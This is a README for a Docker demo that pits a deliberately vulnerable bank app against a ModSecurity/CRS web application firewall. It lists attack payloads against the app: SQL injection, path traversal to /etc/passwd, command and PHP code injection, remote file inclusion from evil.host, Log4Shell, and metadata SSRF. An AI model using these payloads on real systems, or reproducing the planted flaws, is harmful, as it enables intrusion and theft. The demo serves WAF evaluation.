# F5 NGINX WAF — live before/after demo

A **runnable** demo (not a slideshow) that proves the value of a WAF in one
command. **No license required** — the WAF engine is OWASP Core Rule Set on
ModSecurity-NGINX, a drop-in stand-in for F5 NGINX App Protect WAF, so the whole
thing runs on any machine with Docker. (The optional real-F5 path is in
[`f5-app-protect/`](./f5-app-protect/).)

It stands up the *same* vulnerable app two ways:

- **Directly** on `:8081` — no protection. Attacks land on the code and succeed.
- **Behind F5 NGINX WAF** on `:8082` — the same attacks are blocked with `403`
  before they reach the app, while normal traffic passes untouched.

```
                                          ┌─────────────────────────┐
  curl attack ─────────────────────────▶ │  origin  :8081          │  ← NO WAF
                                          │  Acme Bank (vulnerable) │    EXPLOITED
                                          └─────────────────────────┘
                    ┌──────────────────┐  ┌─────────────────────────┐
  curl attack ────▶ │  WAF  :8082      │─▶│  origin  (internal)     │  ← WAF in front
                    │  NGINX + WAF      │  │  Acme Bank (vulnerable) │    BLOCKED (403)
                    └──────────────────┘  └─────────────────────────┘
                     403 before it ever reaches the app
```

## Run it

```bash
cd f5-nginx-waf-live-demo
docker compose up --build -d      # start origin (:8081) + WAF (:8082)
./run-demo.sh                     # fire the attacks, see before vs after
```

`run-demo.sh` fires a **comprehensive capability matrix** at both the raw origin
and the WAF and prints a scorecard — every attack blocked, every legitimate
request allowed:

```
  ### Injection & OWASP Top 10
  SQL injection            origin exploited  WAF 403 BLOCKED
  Reflected XSS            origin exploited  WAF 403 BLOCKED
  ...
  Capability scorecard: 17/17 enforced correctly
  PASS -- every attack blocked, every legitimate request allowed.
```

Tear down with `./stop.sh` (or `docker compose down`).

## Capabilities demonstrated

The origin (`Acme Bank customer portal`) is deliberately vulnerable; each flaw
maps to a real WAF capability. All verified blocked (`403`) at CRS paranoia
level 1 while legitimate traffic passes:

| Category | Attack | Example |
|----------|--------|---------|
| Injection / OWASP Top 10 | SQL injection | `/products?cat=deposit' OR '1'='1` → dumps hashes + SSNs |
| | Reflected XSS | `/search?q=<script>…</script>` |
| | Command injection (RCE) | `/ping?host=127.0.0.1;whoami` |
| | Code injection (PHP) | `/render?tpl=<?php system('id')?>` |
| | Path traversal (LFI) | `/download?file=../../../../etc/passwd` |
| | Remote file inclusion | `/fetch?url=http://evil.host/shell.txt?` |
| Threat campaigns | Log4Shell (JNDI) | `/lookup?user=${jndi:ldap://…}` |
| | SSRF (cloud metadata) | `/fetch?url=http://169.254.169.254/…` |
| Bot & scanner defense | Scanner signatures | `User-Agent: sqlmap` / `nikto` |
| Protocol enforcement | Disallowed method | `PUT` / `DELETE` |

> Not every class is caught at PL1 — e.g. a bare `;id` command-injection token or
> `{{7*7}}` template probe slip through. Raising `PARANOIA` in the compose file
> widens coverage at the cost of more false positives; that tradeoff *is* the
> demo. `run-demo.sh` uses payloads verified to block at PL1.

See it for yourself against the **unprotected** origin:

```bash
# SQLi — leaks credentials the app should never expose
curl "http://localhost:8081/products?cat=deposit%27%20OR%20%271%27=%271"
#   admin / $2b$12$Q9s.KXo3...LEAKED... / SSN 412-90-1174

# Path traversal — reads a file outside the app
curl "http://localhost:8081/download?file=../../../../etc/passwd"
#   root:x:0:0:root:/root:/bin/bash ...
```

Now send the identical request **through the WAF** (`:8082`) and it returns
`403 Forbidden` — the request never reaches the app.

## What's doing the blocking

Out of the box the WAF layer runs the **OWASP Core Rule Set on
ModSecurity-NGINX** (`owasp/modsecurity-crs:nginx`) in anomaly-scoring blocking
mode. It's license-free, so this demo reproduces on any machine in seconds. The
blocks you see are real — inspect them:

```bash
docker compose logs waf | grep -i "Access denied\|Anomaly Score"
```

You'll see each attack matched (libinjection SQLi/XSS, LFI path-traversal, RCE
signatures) and the request interrupted once the inbound anomaly score crossed
the threshold.

> **A note on WAF tuning.** A bare `;id` command-injection payload slips through
> CRS at the default paranoia level — `id` is too short a token to flag without
> false positives. The demo uses `;whoami`, a realistic payload CRS catches. This
> is exactly the tuning tradeoff (coverage vs. false positives) you manage on a
> real WAF: raise `PARANOIA` in `docker-compose.yml` for broader coverage, or add
> targeted rules. Flip `MODSEC_RULE_ENGINE` to `DetectionOnly` to watch attacks
> get logged but pass through — useful when tuning a new policy against live
> traffic before you start blocking.

## Running it on the real F5 NGINX App Protect WAF v5

The topology, the attacks, and `run-demo.sh` are identical — only the
enforcement engine changes. To run the licensed **F5 NGINX App Protect WAF v5**
engine (SQLi/XSS/RCE/LFI signature sets, threat campaigns, Data Guard) instead
of CRS, see [`f5-app-protect/`](./f5-app-protect/). It needs an F5
subscription or free 30-day trial and ships the real declarative policy,
`nginx.conf`, and the three-container NAP v5 compose file.

## Deploy it beyond your laptop

| Where | How | Docs |
|-------|-----|------|
| **Local (Docker)** | `docker compose up` + `./run-demo.sh` (comprehensive matrix) | this file |
| **A single node (SSH + Docker)** | WAF published on one port, origin internal | [`deploy/README.md`](./deploy/README.md) |
| **Kubernetes (k3s)** | `kubectl apply -k k8s/` — Traefik ingress `payments.fictionally.org` → WAF → origin, hardened pods, NetworkPolicy containment | [`k8s/README.md`](./k8s/README.md) |

The k3s ingress `payments.fictionally.org` is wired to the **in-cluster** WAF pod
by default (`service: waf` / `port: 8080`), which proxies to the in-cluster origin
pod — the whole path stays inside the cluster. It is live publicly over HTTPS
through the wslproxy tunnel. To route to the off-cluster node WAF from demo 2
instead, set the ingress backend to `service: node-waf` / `port: 9080` (an
external-backend Service → `192.168.1.140:9080`).

> **`SAFE_MODE`** — the origin's file-read and command-injection flaws are
> *real* by default (local Docker) so the exploit is genuine. On shared infra
> (the k8s and node deployments) it runs with `SAFE_MODE=1`, which **simulates**
> those exploit outcomes so a WAF bypass can't cause real damage. The WAF's
> block/allow behavior is identical either way.

## Files

```
f5-nginx-waf-live-demo/
├── docker-compose.yml     # origin (:8081) + WAF (:8082)
├── run-demo.sh            # the before/after test — this is the demo
├── stop.sh                # tear everything down
├── origin/                # the deliberately-vulnerable Acme Bank app (pure stdlib)
│   ├── app.py             #   (SAFE_MODE-aware; single source for all deploys)
│   └── Dockerfile
├── k8s/                   # k3s deployment: pods, ingress, NetworkPolicy, Kustomize
│   ├── kustomization.yaml
│   ├── *-deployment.yaml / *-service.yaml / ingress.yaml / networkpolicy.yaml
│   ├── origin-configmap.yaml   # generated from origin/app.py
│   ├── test-ingress.sh
│   └── README.md
├── deploy/                # single-node (SSH + Docker) deployment
│   ├── node-demo.compose.yml
│   ├── test-node.sh
│   └── README.md
└── f5-app-protect/        # drop-in for the real F5 NGINX App Protect WAF v5
    ├── docker-compose.f5.yml
    ├── Dockerfile
    ├── nginx.conf
    ├── policies/acme_bank_policy.json
    └── README.md
```

⚠️ The origin app is **intentionally insecure** and runs inside an isolated
container for this demo only. Never expose it to a real network.
